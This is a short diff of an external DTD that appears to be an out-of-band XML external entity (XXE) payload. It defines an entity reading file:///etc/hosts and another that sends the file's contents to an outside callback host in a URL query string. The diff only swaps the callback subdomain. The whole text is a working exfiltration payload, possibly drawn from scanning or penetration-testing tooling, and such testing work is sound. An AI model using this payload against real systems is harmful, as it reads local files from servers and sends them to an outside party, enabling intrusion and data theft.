@@ -1,4 +1,5 @@
 <!ENTITY % file SYSTEM "file:///etc/hosts">
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://4mrto8d2z23vkc0fccsfjla95xu.external.internal.pingbackmetrics.com/?p=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://4mrto8d2z23vkc0d5zq0fccsfjla95xu.external.internal.pingbackmetrics.com/?p=%file;'>">
 %all;
+
 
